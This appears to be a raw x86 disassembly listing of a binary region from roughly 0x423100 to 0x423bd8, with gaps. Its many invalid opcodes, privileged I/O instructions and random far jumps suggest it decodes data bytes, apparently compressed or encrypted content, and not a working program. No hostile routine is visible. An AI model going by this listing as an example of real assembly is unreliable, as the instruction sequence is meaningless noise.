  423100:	retf   0x39b5
  423103:	xlat   BYTE PTR ds:[ebx]
  423104:	dec    esp
  423105:	sub    BYTE PTR [edi],al
  423107:	ror    BYTE PTR [esi],1
  423109:	pop    ds
  42310a:	out    dx,eax
  42310b:	pop    esp
  42310c:	mov    ah,0xbe
  42310e:	outs   dx,BYTE PTR ds:[esi]
  42310f:	jle    0x423107
  423111:	in     al,0xd0
  423113:	mov    ss,WORD PTR [edi]
  423115:	sub    al,0x78
  423117:	lock cmp al,0xeb
  42311a:	push   es
  42311b:	fnstsw WORD PTR [esi]
  42311d:	lahf   
  42311e:	dec    edi
  42311f:	mov    dh,0x63
  423121:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423122:	mov    BYTE PTR [edx-0x6649616b],dh
  423128:	pop    ebp
  423129:	inc    edx
  42312a:	jmp    0x4230e3
  42312c:	xlat   BYTE PTR ds:[ebx]
  42312d:	imul   esi,DWORD PTR ds:0xf0091c07,0x34
  423134:	call   0xba844134
  423139:	mov    edi,0x65c99315
  42313e:	fist   DWORD PTR [eax+ebx*2+0x70c46154]
  423145:	hlt    
  423146:	test   eax,eax
  423148:	or     al,dl
  42314a:	push   esi
  42314b:	std    
  42314c:	ror    DWORD PTR [esp+edx*4+0x3cae3fa2],1
  423153:	fsubp  st(3),st
  423155:	xchg   DWORD PTR [eax+0x34],edx
  423158:	out    0x35,al
  42315a:	sbb    BYTE PTR ds:0x5448bd4b,bl
  423160:	cmp    eax,0x8ea208c8
  423165:	sbb    bh,BYTE PTR [esp+esi*4+0x1988cee3]
  42316c:	retf   0x3a40
  42316f:	or     al,0x1e
  423171:	xchg   esp,eax
  423172:	mov    esp,0x50e5c05d
  423177:	or     eax,0x7b9c2618
  42317c:	inc    eax
  42317d:	dec    ecx
  42317e:	cmp    dl,0x9
  423181:	out    dx,eax
  423182:	or     eax,0xfe6e8869
  423187:	jle    0x4231f7
  423189:	jmp    0x4231a8
  42318b:	push   cs
  42318c:	mov    edx,edx
  42318e:	push   0x7e
	...
  4231f3:	add    BYTE PTR [ecx-0xf],bh
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx+0x242856e9],esp
  423204:	fs jbe 0x423208
  423207:	add    BYTE PTR [ecx+eax*1],al
  42320a:	add    BYTE PTR [eax],al
  42320c:	xor    eax,0x253a68f5
  423211:	sbb    al,0xb7
  423213:	std    
  423214:	and    DWORD PTR [eax-0x52e0ad14],edx
  42321a:	push   0x41
  42321c:	mov    edx,0x5baeff5e
  423221:	loopne 0x4231f2
  423223:	sbb    BYTE PTR [ecx-0x77],cl
  423226:	xor    esp,DWORD PTR [ebx+eax*4+0x7902c8f5]
  42322d:	sub    ecx,DWORD PTR ds:0x9b08a160
  423233:	das    
  423234:	mov    dl,0x4c
  423236:	jmp    0xb1f3:0x206ae32a
  42323d:	mov    dh,0xe9
  42323f:	cwde   
  423240:	jne    0x423208
  423242:	call   FWORD PTR [edx]
  423244:	pop    ecx
  423245:	sub    esi,esi
  423247:	mov    dh,BYTE PTR [edx+0x4e]
  42324a:	mov    ah,BYTE PTR [ecx-0x4bcace24]
  423250:	mov    cl,cl
  423252:	rcr    BYTE PTR [eax+eax*1+0x1427a416],cl
  423259:	sti    
  42325a:	add    al,0xed
  42325c:	nop
  42325d:	jns    0x42321d
  42325f:	retf   0x8811
  423262:	setne  BYTE PTR [eax]
  423265:	xchg   ebp,eax
  423266:	dec    ebp
  423267:	shl    BYTE PTR ds:0x9929320c,0xaf
  42326e:	push   eax
  42326f:	pop    esp
  423270:	rcr    DWORD PTR [ebx+edx*2-0x2044e211],0xf7
  423278:	jns    0x423241
  42327a:	and    al,0xeb
  42327c:	dec    edi
  42327d:	cli    
  42327e:	addr16 push 0x56
  423281:	rcl    BYTE PTR [esi],cl
  423283:	jp     0x423298
  423285:	in     al,0x41
  423287:	cmc    
  423288:	(bad)  
  423289:	loop   0x423291
  42328b:	mov    BYTE PTR [ecx+0x25f05d49],bh
  423291:	dec    DWORD PTR [edx+0x7821cbb6]
  423297:	clc    
  423298:	call   0x49dd:0xfe43a7bd
  42329f:	and    al,0xba
  4232a1:	lods   al,BYTE PTR ds:[esi]
  4232a2:	inc    ebp
  4232a3:	push   0x77fd7933
  4232a8:	sti    
  4232a9:	in     al,dx
  4232aa:	stos   BYTE PTR es:[edi],al
  4232ab:	mov    bh,0x8e
  4232ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232ae:	test   eax,0x28936e6a
  4232b3:	sti    
  4232b4:	mov    esi,0x7c7e30b6
  4232b9:	fnstcw WORD PTR [esi*4+0x3b63abdd]
  4232c0:	xchg   ebp,eax
  4232c1:	mov    eax,ds:0x4f24b320
  4232c6:	inc    esp
  4232c7:	rol    eax,0xd4
  4232ca:	stc    
  4232cb:	shr    DWORD PTR [edx-0x675d3bcf],0x65
  4232d2:	pop    es
  4232d3:	jns    0x423348
  4232d5:	pop    ebx
  4232d6:	dec    edx
  4232d7:	push   cs
  4232d8:	jmp    0xef87:0xe372e43b
  4232df:	mov    ebp,0x4c62443a
  4232e4:	add    al,0x96
  4232e7:	mov    edi,0x26041f82
  4232ec:	shl    bh,0x4f
  4232ef:	mov    cl,cl
  4232f1:	ins    BYTE PTR es:[edi],dx
  4232f2:	mov    al,0x19
  4232f4:	cmp    eax,0x9791a48a
  4232f9:	and    bl,BYTE PTR [ecx-0x43d4dfc7]
  4232ff:	in     al,0x5
  423301:	mov    ecx,DWORD PTR ds:0x49b3e59b
  423307:	lods   al,BYTE PTR ds:[esi]
  423308:	xor    DWORD PTR [esi],edx
  42330a:	jno    0x4232e3
  42330c:	push   edx
  42330d:	ss pop ebp
  42330f:	jp     0x423311
	...
  423371:	add    BYTE PTR [eax],al
  423373:	add    al,bh
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0xcdc50f44
  423382:	pop    ds
  423383:	das    
  423384:	push   0x4000177
  423389:	add    DWORD PTR [eax],eax
  42338b:	add    BYTE PTR [esi],dl
  42338d:	lods   eax,DWORD PTR ds:[esi]
  42338e:	or     al,BYTE PTR [esi+0x4b8082bc]
  423394:	sub    ebp,DWORD PTR [edx+ebx*4]
  423397:	mov    ebx,DWORD PTR ds:[ebx+edi*4]
  42339b:	push   ds
  42339c:	rol    BYTE PTR [ebx-0x6a],cl
  42339f:	bnd repz ret 0xec74
  4233a4:	and    eax,0x11e2df02
  4233a9:	add    al,0x85
  4233ab:	pop    ss
  4233ac:	sub    DWORD PTR [eax+ecx*4],ecx
  4233af:	hlt    
  4233b0:	stos   DWORD PTR es:[edi],eax
  4233b1:	mov    ?,WORD PTR [ecx+0x61]
  4233b4:	pushf  
  4233b5:	test   DWORD PTR [ebx+0x22bd926c],0x618ac14c
  4233bf:	shr    ebx,0xa3
  4233c2:	pop    ds
  4233c3:	dec    edx
  4233c4:	pop    es
  4233c5:	add    ch,bh
  4233c7:	repz pop ebx
  4233c9:	mov    edi,0x84c54222
  4233ce:	push   edx
  4233cf:	jo     0x4233fc
  4233d1:	imul   ebp,esp,0xfffffff0
  4233d4:	push   cs
  4233d5:	cdq    
  4233d6:	repnz push esp
  4233d8:	and    edi,DWORD PTR [edx-0x2621bd6c]
  4233de:	jne    0x4233b9
  4233e0:	adc    al,0xcc
  4233e2:	gs mov ch,0xf2
  4233e5:	repnz mov esp,0x23cca839
  4233eb:	pushf  
  4233ec:	cmp    DWORD PTR [ebp-0x6ab8991f],esi
  4233f2:	xchg   ecx,eax
  4233f3:	cmp    DWORD PTR [edx-0x6caf2eb4],ebx
  4233f9:	sub    eax,DWORD PTR [ebx]
  4233fb:	mov    ch,dl
  4233fd:	and    al,BYTE PTR [ecx-0x2e]
  423400:	and    dl,bl
  423402:	xor    BYTE PTR [eax],ah
  423404:	jg     0x4233fe
  423406:	sbb    ebx,DWORD PTR [ebx]
  423408:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423409:	add    al,0x74
  42340b:	repz aaa 
  42340d:	xchg   ebp,eax
  42340e:	rcl    ecx,cl
  423410:	cmp    eax,0x97790911
  423415:	fbstp  TBYTE PTR [eax-0x572b7305]
  42341b:	push   eax
  42341c:	fisub  DWORD PTR [ebp-0x79194aa2]
  423422:	stos   DWORD PTR es:[edi],eax
  423423:	jmp    0x423464
  423425:	ins    DWORD PTR es:[edi],dx
  423426:	and    esi,DWORD PTR [esp+ecx*1-0x1d]
  42342a:	lods   eax,DWORD PTR ds:[esi]
  42342b:	and    DWORD PTR [edi],edx
  42342d:	sub    cl,BYTE PTR [ecx+0x1f83ae1]
  423433:	lds    esi,FWORD PTR [edi-0x39]
  423436:	adc    ebx,DWORD PTR [ebp-0x6053dd65]
  42343c:	jnp    0x423412
  42343e:	call   0x3a409a2d
  423443:	lods   al,BYTE PTR ds:[esi]
  423444:	or     bl,ah
  423446:	adc    eax,0xaa47d71c
  42344b:	mov    eax,ds:0xddb1c823
  423450:	pop    es
  423451:	(bad)  
  423452:	xor    eax,0x90c0fe16
  423457:	into   
  423458:	shl    BYTE PTR [edi-0x793ebfee],1
  42345e:	mov    edi,DWORD PTR [edi+0x922efb5]
  423464:	hlt    
  423465:	sub    bl,al
  423467:	ror    DWORD PTR [esi-0x483d88eb],1
  42346d:	mov    cl,0xfd
  42346f:	mov    ds:0xd7995aa1,al
  423474:	dec    eax
  423475:	out    0x1b,eax
  423477:	iret   
  423478:	cmp    DWORD PTR [edx-0x78b83f29],ebp
  42347e:	mov    cl,dl
  423480:	cmp    al,0x9f
  423482:	fisttp WORD PTR [ebx-0x2d68ed4e]
  423488:	push   edx
  423489:	jp     0x4234a1
  42348b:	xor    BYTE PTR [ecx+0x22243c],bh
	...
  4234f1:	add    BYTE PTR [eax],al
  4234f3:	add    al,al
  4234f5:	mov    al,0x45
  4234f7:	outs   dx,DWORD PTR ds:[esi]
  4234f8:	jne    0x4234f9
  4234fa:	jmp    0x191f:0xadf467bf
  423501:	mov    ebx,0x786ce63f
  423506:	add    DWORD PTR [eax],eax
  423508:	add    al,0x1
  42350a:	add    BYTE PTR [eax],al
  42350c:	inc    ebp
  42350d:	movq   mm6,QWORD PTR [ebx]
  423510:	jo     0x42355d
  423512:	ret    
  423513:	es ret 
  423515:	pop    ebx
  423516:	fcomp  DWORD PTR [ecx-0x5a86892]
  42351c:	test   esp,esp
  42351e:	and    al,0xff
  423520:	mov    eax,ds:0x476a011b
  423525:	mov    esi,0x75e73b01
  42352a:	into   
  42352b:	fcomi  st,st(7)
  42352d:	out    0x14,eax
  42352f:	sbb    eax,0x3669874a
  423534:	mov    DWORD PTR [ecx+0x22300f54],ebp
  42353a:	ds jo  0x4234d0
  42353d:	sbb    BYTE PTR [esi-0x5411cd1a],0xae
  423544:	jmp    0x8df4:0x24bda566
  42354b:	iret   
  42354c:	mov    ebp,0xfa9c1579
  423551:	mov    ebx,0x7c5a5754
  423556:	pop    ebp
  423557:	add    ch,cl
  423559:	frstor [ecx+0x5e]
  42355c:	retf   
  42355d:	pop    esp
  42355e:	dec    eax
  42355f:	jg     0x42353d
  423561:	push   edi
  423562:	not    al
  423564:	arpl   WORD PTR [edx],bx
  423566:	pop    es
  423567:	fdiv   DWORD PTR [eax-0x6f]
  42356a:	push   0xfffffff0
  42356c:	aas    
  42356d:	jp     0x4235eb
  42356f:	pop    edi
  423570:	push   ebp
  423571:	and    ah,ch
  423573:	add    eax,0x8bb9d75b
  423578:	(bad)  
  423579:	sti    
  42357a:	jmp    0xba0e:0x67fc97a5
  423581:	cwde   
  423582:	inc    ecx
  423583:	or     BYTE PTR [ecx],0x21
  423586:	bound  ebx,QWORD PTR [ebx]
  423588:	cdq    
  423589:	int    0xf8
  42358b:	xor    al,0x40
  42358d:	sub    BYTE PTR [ebp-0x1],0x9d
  423591:	fidiv  DWORD PTR [edx+esi*1-0x13a500a9]
  423598:	(bad)  
  423599:	mov    ds:0x4f1fdce6,eax
  42359e:	and    dl,BYTE PTR [eax+0x4b]
  4235a1:	mov    eax,ds:0xd1ded362
  4235a6:	mov    ah,0xd5
  4235a8:	cdq    
  4235a9:	inc    esi
  4235aa:	push   cs
  4235ab:	inc    esi
  4235ac:	mov    cl,0x22
  4235ae:	sahf   
  4235af:	or     ebp,DWORD PTR [esi]
  4235b1:	mov    ds:0x7455062d,al
  4235b6:	and    ebp,DWORD PTR [edi-0x29]
  4235b9:	xchg   edx,eax
  4235ba:	int3   
  4235bb:	push   edx
  4235bc:	(bad)  
  4235bd:	clc    
  4235be:	or     DWORD PTR [esi-0x622e3252],eax
  4235c4:	(bad)  
  4235c6:	sub    al,0xa7
  4235c8:	dec    esp
  4235c9:	iret   
  4235ca:	(bad)  
  4235cb:	mov    ah,0xc7
  4235cd:	inc    ebp
  4235ce:	jno    0x42358c
  4235d0:	pop    ss
  4235d1:	mov    ah,0x24
  4235d3:	xor    al,0xd8
  4235d5:	dec    eax
  4235d6:	xlat   BYTE PTR ds:[ebx]
  4235d7:	int    0x31
  4235d9:	aaa    
  4235da:	pusha  
  4235db:	jo     0x42355f
  4235dd:	fstp   QWORD PTR [ebx+edi*8-0x1acdcef8]
  4235e4:	dec    esi
  4235e5:	and    bl,bl
  4235e7:	ret    0x7e76
  4235ea:	mov    edx,DWORD PTR [ebx+0x6d]
  4235ed:	adc    bh,BYTE PTR [esi]
  4235ef:	xor    al,0x65
  4235f1:	rol    BYTE PTR [edi*2+0x6d4aa529],0x65
  4235f9:	cmc    
  4235fa:	pop    edi
  4235fb:	mov    ch,0x34
  4235fd:	mov    ds:0x9fb77c4f,eax
  423602:	inc    esi
  423603:	(bad)  
  423604:	sti    
  423605:	jbe    0x4235e0
  423607:	(bad)  
  423608:	and    DWORD PTR [eax-0x634a70e1],eax
  42360e:	pop    edx
  42360f:	aaa    
	...
  423674:	or     BYTE PTR [edi-0x8808b84],0x88
  42367b:	jmp    FWORD PTR [esi-0x6f]
  42367e:	jl     0x423693
  423680:	ja     0x423667
  423682:	inc    esi
  423683:	sub    eax,0x17970
  423688:	add    al,0x1
  42368a:	add    BYTE PTR [eax],al
  42368c:	mov    DWORD PTR ds:0x5c587741,edx
  423692:	(bad)  
  423693:	loop   0x42364a
  423695:	ror    BYTE PTR [esi],0x79
  423698:	daa    
  423699:	mov    ds:0x47c6d2a4,eax
  42369e:	popa   
  42369f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236a0:	dec    ebp
  4236a1:	ins    DWORD PTR es:[edi],dx
  4236a2:	test   BYTE PTR [eax-0x232b3d7d],ah
  4236a8:	sbb    eax,0x1e4ec308
  4236ad:	shl    DWORD PTR [ebx-0x62],1
  4236b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4236b1:	repnz or al,0xcf
  4236b4:	pop    esp
  4236b5:	adc    ah,0xe9
  4236b8:	or     DWORD PTR [ebx+0x1ad6ed61],edi
  4236be:	sti    
  4236bf:	mov    dh,0xb6
  4236c1:	lahf   
  4236c2:	test   cl,bl
  4236c4:	mov    ss,edi
  4236c6:	addr16 out dx,al
  4236c8:	push   ebp
  4236c9:	inc    eax
  4236ca:	mov    al,ds:0x1cc14831
  4236cf:	retf   0xf059
  4236d2:	inc    ebp
  4236d3:	mov    esi,0x6b9cc7a
  4236d8:	in     al,0xbe
  4236da:	inc    esp
  4236db:	ficom  WORD PTR [edx-0x4d]
  4236de:	cwde   
  4236df:	mov    al,ds:0xc7926b0b
  4236e4:	mov    edi,DWORD PTR [ebx-0x5626d25c]
  4236ea:	sub    al,0x97
  4236ec:	cmp    cl,0x42
  4236ef:	retf   0x6fae
  4236f2:	scas   al,BYTE PTR es:[edi]
  4236f3:	hlt    
  4236f4:	pop    es
  4236f5:	sbb    esi,DWORD PTR ds:0x620238e8
  4236fb:	mov    esp,0x1eb18db9
  423700:	mov    ch,0x18
  423702:	loop   0x4236de
  423704:	cdq    
  423705:	or     BYTE PTR [edx-0x68d5389f],bl
  42370b:	sbb    DWORD PTR [eax+edx*2],ecx
  42370e:	push   cs
  42370f:	jo     0x423699
  423711:	or     eax,0x9a80cb9c
  423716:	jle    0x4236ea
  423718:	pushf  
  423719:	lods   eax,DWORD PTR ds:[esi]
  42371a:	shl    DWORD PTR [edi],cl
  42371c:	jp     0x4236c3
  42371e:	loope  0x42375f
  423720:	int    0x74
  423722:	push   0xffffffdd
  423724:	inc    esi
  423725:	and    ebx,esp
  423727:	jnp    0x423725
  423729:	scas   eax,DWORD PTR es:[edi]
  42372a:	add    al,0x81
  42372c:	xchg   ecx,eax
  42372d:	jmp    0x5998273f
  423732:	add    ch,BYTE PTR [ebx-0x21a741e2]
  423738:	mov    esp,0x1c2586b7
  42373d:	inc    edx
  42373e:	mov    eax,ds:0xb1eeaf74
  423743:	push   cs
  423744:	push   0xf1680502
  423749:	test   al,0x4c
  42374b:	cwde   
  42374c:	ret    0xb82e
  42374f:	push   0xffffffa1
  423751:	ret    0x6388
  423754:	jbe    0x423724
  423756:	dec    eax
  423757:	std    
  423758:	lahf   
  423759:	pop    esi
  42375a:	mov    ?,WORD PTR [ecx-0x1c]
  42375d:	or     DWORD PTR [esi-0x80],0xeb536f36
  423764:	adc    esp,ebx
  423766:	js     0x42376f
  423768:	mov    eax,0x873c34a4
  42376d:	repz inc ebx
  42376f:	lock in eax,dx
  423771:	push   eax
  423772:	repnz xor eax,0x862b1185
  423778:	leave  
  423779:	loop   0x423723
  42377b:	dec    esi
  42377c:	arpl   WORD PTR [edx+0x28],si
  42377f:	lahf   
  423780:	sbb    DWORD PTR [edx+0x26],ebp
  423783:	mov    eax,DWORD PTR [ebx+edx*8+0x94b1a42]
  42378a:	and    dh,BYTE PTR [ebx-0x7a]
  42378d:	test   BYTE PTR [edx+0x63],dl
	...
  4237f4:	xor    al,0x23
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7a74:0xa346948e
  423806:	add    DWORD PTR [eax],eax
  423808:	add    al,0x1
  42380a:	add    BYTE PTR [eax],al
  42380c:	and    bh,0xb4
  42380f:	cmp    BYTE PTR [ebx],dl
  423811:	pop    ebx
  423812:	jecxz  0x4237e9
  423814:	cdq    
  423815:	xchg   ebx,eax
  423816:	out    0x6a,al
  423818:	ja     0x4237cb
  42381a:	out    dx,eax
  42381b:	pop    esi
  42381c:	rol    BYTE PTR [eax-0x4f9517fd],cl
  423822:	pop    edi
  423823:	int3   
  423824:	mov    ah,0x9b
  423826:	and    bl,BYTE PTR [ebx+0x6c]
  423829:	dec    esi
  42382a:	scas   al,BYTE PTR es:[edi]
  42382b:	mov    ch,0xc6
  42382d:	loop   0x42387d
  42382f:	mov    dl,0x7a
  423831:	call   0x16966e7a
  423836:	adc    ebp,DWORD PTR [esi+0x64]
  423839:	push   ecx
  42383a:	rcr    DWORD PTR [edi*1+0x105f621c],0xc6
  423842:	mov    bl,0xb3
  423844:	dec    edx
  423845:	and    esp,esi
  423847:	xchg   ecx,eax
  423848:	cmp    ah,BYTE PTR [ebp+eiz*4-0x16]
  42384c:	shr    BYTE PTR [esi-0x76],1
  42384f:	stos   DWORD PTR es:[edi],eax
  423850:	popf   
  423851:	in     eax,0x1f
  423853:	push   ds
  423854:	std    
  423855:	xor    esi,DWORD PTR [esi]
  423857:	mov    ebx,0x2f1f67a1
  42385c:	jno    0x423858
  42385e:	and    ah,dl
  423860:	push   0xfffffff3
  423862:	xor    dh,BYTE PTR [edx]
  423864:	add    esp,DWORD PTR [esi+0x6b]
  423867:	imul   edx,ecx,0x37
  42386a:	sahf   
  42386b:	adc    al,0x7c
  42386d:	inc    ecx
  42386e:	popa   
  42386f:	sbb    cl,BYTE PTR [esi+eiz*2+0x6e6918a0]
  423876:	nop
  423877:	inc    ebx
  423878:	push   es
  423879:	fdivp  st(5),st
  42387b:	in     al,dx
  42387c:	popf   
  42387d:	dec    ebp
  42387e:	sar    DWORD PTR [eax+eiz*8+0x5e],0xa6
  423883:	adc    al,0xc0
  423885:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423886:	pop    edi
  423887:	jb     0x423859
  423889:	das    
  42388a:	arpl   WORD PTR [ebp+0x6e],bx
  42388d:	add    dh,BYTE PTR [ebp+0x6e]
  423890:	mov    ecx,es
  423892:	jg     0x423904
  423894:	dec    BYTE PTR [edx-0xea0faa]
  42389a:	aaa    
  42389b:	xchg   ecx,eax
  42389c:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  42389e:	ins    DWORD PTR es:[edi],dx
  42389f:	mov    ds:0x17f615a9,al
  4238a4:	rcl    DWORD PTR [esp+ebp*1+0x24515413],cl
  4238ab:	mov    al,ds:0xc5c6795d
  4238b0:	add    ah,dl
  4238b2:	aas    
  4238b3:	push   esp
  4238b4:	(bad)  [eax-0x3e595ee6]
  4238ba:	test   BYTE PTR [ebx+0x1b],0x9
  4238be:	(bad)  
  4238bf:	aas    
  4238c0:	pop    DWORD PTR [edi-0xaf1a92e]
  4238c6:	mov    cl,0x9e
  4238c8:	sbb    ch,BYTE PTR [esi]
  4238ca:	mov    ecx,0x2bb48436
  4238cf:	mov    ebx,0x1fdea19f
  4238d4:	sub    al,BYTE PTR [esi]
  4238d6:	adc    eax,0x18c111
  4238db:	and    DWORD PTR [ebx+0xf],0xcdb1d456
  4238e2:	loop   0x423889
  4238e4:	inc    edx
  4238e5:	ror    dl,1
  4238e7:	add    eax,0x32fcffaa
  4238ec:	adc    DWORD PTR [esi-0x53],eax
  4238ef:	mov    dh,0x19
  4238f1:	sysret 
  4238f3:	push   0xffffff8a
  4238f5:	ins    BYTE PTR es:[edi],dx
  4238f6:	ja     0x42392b
  4238f8:	mov    bl,0x2a
  4238fa:	retf   
  4238fb:	jle    0x42390e
  4238fd:	retf   0x69a9
  423900:	ret    
  423901:	xor    DWORD PTR [ebx+0xe8f86f1],esi
  423907:	inc    edi
  423908:	mov    ah,0x53
  42390a:	dec    DWORD PTR [ebp-0x1a9cbae1]
	...
  423974:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0xd9082bbd
  423982:	xor    eax,0x17b78fc
  423987:	add    BYTE PTR [ecx+eax*1],al
  42398a:	add    BYTE PTR [eax],al
  42398c:	or     ah,dh
  42398e:	push   esp
  42398f:	adc    DWORD PTR [ebx+0x36],edx
  423992:	fimul  DWORD PTR [edi+ebp*1-0x44]
  423996:	mov    eax,ds:0xa29ca616
  42399b:	loopne 0x423932
  42399d:	or     BYTE PTR [ecx+0x5c],ch
  4239a0:	jl     0x423980
  4239a2:	push   ecx
  4239a3:	jmp    0xbefa:0x31f42b43
  4239aa:	pop    ss
  4239ab:	jo     0x423953
  4239ad:	xchg   edx,eax
  4239ae:	xchg   BYTE PTR [edi+ecx*1-0x1c8f7422],al
  4239b5:	inc    ebp
  4239b6:	std    
  4239b7:	dec    ecx
  4239b8:	xchg   BYTE PTR [esi-0x10],dl
  4239bb:	sub    DWORD PTR [esp+esi*8-0x55aaf5e7],0xffffffd2
  4239c3:	sar    DWORD PTR [ebp-0x7d0acb0c],1
  4239c9:	jmp    0x81bf:0x7155968f
  4239d0:	div    BYTE PTR [ebx]
  4239d2:	xchg   edi,eax
  4239d3:	bound  eax,QWORD PTR [ebx-0x72c2bc11]
  4239d9:	fisttp WORD PTR [bx+di+0x17]
  4239dd:	mov    dh,0x60
  4239df:	dec    edi
  4239e0:	lds    ebp,FWORD PTR [ecx]
  4239e2:	cld    
  4239e3:	nop
  4239e4:	out    dx,eax
  4239e5:	sub    eax,DWORD PTR [esi-0xd8e7606]
  4239eb:	add    ah,BYTE PTR [edx-0xabee9b2]
  4239f1:	xchg   ecx,eax
  4239f2:	loopne 0x4239f9
  4239f4:	ss pop ds
  4239f6:	retf   0x7236
  4239f9:	or     eax,0xfae2779c
  4239fe:	arpl   WORD PTR [ecx-0x40],dx
  423a01:	cmp    esp,DWORD PTR [ecx+ecx*1+0x76]
  423a05:	or     dl,ah
  423a07:	pop    edx
  423a08:	icebp  
  423a09:	pushf  
  423a0a:	sub    dh,bh
  423a0c:	mov    esp,0x2bf588bb
  423a11:	test   BYTE PTR [eax+0x13],0xff
  423a15:	jge    0x423a56
  423a17:	js     0x423a02
  423a19:	into   
  423a1a:	leave  
  423a1b:	(bad)  
  423a1d:	and    al,0x12
  423a1f:	cmp    eax,0xc59fbcad
  423a24:	test   BYTE PTR [edi+eiz*1],0xd3
  423a28:	rcr    DWORD PTR [ebp-0x31],cl
  423a2b:	not    edx
  423a2d:	add    ah,dl
  423a2f:	adc    ch,BYTE PTR [edx]
  423a31:	add    al,0xe5
  423a33:	mov    esp,0xff50affe
  423a38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a39:	xor    BYTE PTR [ebp+0x2cf82b58],bh
  423a3f:	div    DWORD PTR [edi]
  423a41:	push   eax
  423a42:	fwait
  423a43:	pop    ebx
  423a44:	int    0x6c
  423a46:	add    DWORD PTR [eax],ebp
  423a48:	into   
  423a49:	das    
  423a4a:	xchg   esp,eax
  423a4b:	mov    ss,ebx
  423a4d:	call   0xb51f4eb
  423a52:	aam    0x71
  423a54:	add    cl,BYTE PTR [ecx-0x171fe2db]
  423a5a:	add    DWORD PTR [esi+0x9070b99],esi
  423a60:	repnz loop 0x4239e9
  423a63:	xor    al,0x3e
  423a65:	push   esp
  423a66:	pop    eax
  423a67:	push   ebx
  423a68:	mov    WORD PTR [esi],fs
  423a6a:	inc    ebp
  423a6b:	jbe    0x423a04
  423a6d:	pushf  
  423a6e:	xchg   ebx,eax
  423a6f:	popf   
  423a70:	les    ebp,FWORD PTR ds:0x999d5bff
  423a76:	cli    
  423a77:	adc    ch,bh
  423a79:	add    eax,0x659bc570
  423a7e:	out    0x9e,eax
  423a80:	mov    WORD PTR [ebx],es
  423a82:	push   ds
  423a83:	rcr    BYTE PTR [ebp-0x68536a9a],0x5f
  423a8a:	retf   
  423a8b:	aad    0xc8
  423a8d:	jno    0x423a25
  423a8f:	cdq    
	...
  423af4:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	add    DWORD PTR [ebp+esi*4+0x17c7cf2],eax
  423b07:	add    BYTE PTR [ecx+eax*1],al
  423b0a:	add    BYTE PTR [eax],al
  423b0c:	cmp    ebp,DWORD PTR [edi]
  423b0e:	or     ah,BYTE PTR [esi+0x42]
  423b11:	test   DWORD PTR [ecx-0xc9cc9d2],esp
  423b17:	retf   
  423b18:	call   0x185c3032
  423b1d:	pop    ecx
  423b1e:	repnz xor al,0x8e
  423b21:	pop    ecx
  423b22:	inc    ebp
  423b23:	fnsave [edi]
  423b25:	sub    bh,BYTE PTR gs:[edx]
  423b28:	push   es
  423b29:	mov    ds:0xb10589a4,al
  423b2e:	xchg   BYTE PTR [edx+0x61],ah
  423b31:	pop    ss
  423b32:	bound  ebp,QWORD PTR [edx+0x15]
  423b35:	and    al,0x16
  423b37:	mov    ebp,0x7f8b3a36
  423b3c:	mov    WORD PTR [ebp+eiz*1-0x6c60f977],?
  423b43:	in     eax,0x6f
  423b45:	es xor eax,0x584afd5e
  423b4b:	fist   WORD PTR [ebx]
  423b4d:	jb     0x423b50
  423b4f:	jbe    0x423b0e
  423b51:	shl    BYTE PTR [ecx+0x6e],1
  423b54:	mov    bh,0x55
  423b56:	and    al,0x4d
  423b58:	test   BYTE PTR [esi+0x6826fec9],bl
  423b5e:	mov    bh,0xb8
  423b60:	aaa    
  423b61:	cmp    DWORD PTR [ebx],esp
  423b63:	fmul   DWORD PTR [ecx]
  423b65:	je     0x423aec
  423b67:	out    dx,eax
  423b68:	push   ebx
  423b69:	and    eax,0x8e57cddf
  423b6e:	pop    ds
  423b6f:	push   ds
  423b70:	push   cs
  423b71:	in     al,0x28
  423b73:	iret   
  423b74:	add    eax,0xc10c22
  423b79:	scas   al,BYTE PTR es:[edi]
  423b7a:	mov    edi,0xb383041c
  423b7f:	push   esp
  423b80:	stc    
  423b81:	jl     0x423b80
  423b83:	jne    0x423bad
  423b85:	jnp    0x423bcd
  423b87:	xchg   ebx,eax
  423b88:	arpl   WORD PTR [edi],di
  423b8a:	dec    edi
  423b8b:	xor    esp,eax
  423b8d:	sbb    eax,0xe2091ffb
  423b92:	inc    edx
  423b93:	das    
  423b94:	dec    edx
  423b95:	inc    ebp
  423b96:	in     eax,0x50
  423b98:	jne    0x423c0b
  423b9a:	pusha  
  423b9b:	mov    dh,0x66
  423b9d:	jae    0x423bfc
  423b9f:	dec    esi
  423ba0:	pop    eax
  423ba1:	std    
  423ba2:	jb     0x423b74
  423ba4:	imul   ebp,DWORD PTR [edi],0xb305740c
  423baa:	pop    ecx
  423bab:	mov    esi,0x60113102
  423bb0:	cmp    bh,BYTE PTR [ebx+0x37]
  423bb3:	jg     0x423b9e
  423bb5:	fnstenv [ebx-0x58]
  423bb8:	or     BYTE PTR [edi-0x21],ch
  423bbb:	jno    0x423c30
  423bbd:	adc    al,0xa3
  423bbf:	push   edi
  423bc0:	pop    ds
  423bc1:	std    
  423bc2:	adc    BYTE PTR [edi],bh
  423bc4:	iret   
  423bc5:	pushf  
  423bc6:	mul    DWORD PTR [ecx+0x60]
  423bc9:	push   eax
  423bca:	push   esi
  423bcb:	mov    ecx,0x7919e46
  423bd0:	push   ss
  423bd1:	sub    esp,edx
  423bd3:	mov    ebp,0xa4e73d8e
  423bd8:	mov    al,0xf4
